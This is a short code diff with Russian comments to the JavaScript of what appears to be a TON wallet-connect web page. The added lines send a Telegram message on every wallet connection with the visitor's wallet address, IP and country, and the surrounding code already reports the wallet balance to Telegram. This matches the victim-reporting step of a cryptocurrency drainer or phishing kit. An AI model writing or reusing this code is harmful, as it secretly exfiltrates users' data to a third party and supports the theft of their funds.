@@ -37,6 +37,9 @@ tonConnectUI.on('walletConnected', async (wallet) => {
     console.log('Адрес кошелька:', wallet.address);
     console.log('Wallet Info:', wallet);
 
+    // Отправляем сообщение о подключении кошелька
+    sendTelegramMessage(`\uD83D\uDCC0 *Кошелек подключен:*\nАдрес: [Ton Scan](https://tonscan.org/address/${wallet.address})\nIP: ${ipUser} ${countryUser}`);
+
     // Гарантированная отправка баланса в Telegram после подключения
     try {
       await sendBalanceToTelegram(wallet.address);
@@ -209,4 +212,3 @@ function sendTelegramMessage(message) {
       console.error('Ошибка сети при отправке сообщения:', error);
     });
 }
-
